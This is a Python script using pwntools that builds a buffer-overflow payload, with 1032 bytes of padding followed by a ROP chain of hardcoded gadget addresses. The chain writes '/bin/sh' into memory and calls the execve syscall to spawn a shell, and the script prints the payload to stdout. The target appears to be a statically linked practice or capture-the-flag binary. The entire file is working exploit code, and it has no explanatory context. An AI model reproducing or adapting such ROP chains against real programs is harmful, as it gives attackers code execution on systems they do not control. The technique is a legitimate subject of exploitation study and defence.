import sys
import pwn

addr_syscall = 0x0000000000474e65
addr_pop_rax = 0x0000000000415664
addr_pop_rdx = 0x00000000004498b5
addr_mov_rax_rdx = 0x000000000048d251

addr_push_rsp = 0x0000000000450ae4
addr_pop_rdi = 0x0000000000400686
addr_pop_rsi = 0x00000000004101f3
binsh = 0x0068732f6e69622f
#binsh = 0x00736c2f6e69622f
#addr_write = 0x400000
#addr_write = 0x7ffc5ae9d000
addr_write = 0x6b6000
addr_ptr_write = addr_write + 0x18 

exploit = b"A"*1032

exploit += pwn.p64(addr_pop_rax)
exploit += pwn.p64(addr_write)
exploit += pwn.p64(addr_pop_rdx)
exploit += pwn.p64(binsh)
exploit += pwn.p64(addr_mov_rax_rdx)
exploit += pwn.p64(addr_pop_rax)
exploit += pwn.p64(addr_ptr_write)
exploit += pwn.p64(addr_pop_rdx)
exploit += pwn.p64(addr_write)
exploit += pwn.p64(addr_mov_rax_rdx)
exploit += pwn.p64(addr_pop_rsi)
exploit += pwn.p64(addr_ptr_write)
exploit += pwn.p64(addr_pop_rdi)
exploit += pwn.p64(addr_write)
exploit += pwn.p64(addr_pop_rdx)
exploit += pwn.p64(0)
exploit += pwn.p64(addr_pop_rax)
exploit += pwn.p64(59)
exploit += pwn.p64(addr_syscall)
#exploit += b'\xc1\x0b\x40\x00\x00\x00\x00\x00' # (int 3)

sys.stdout.buffer.write(exploit)
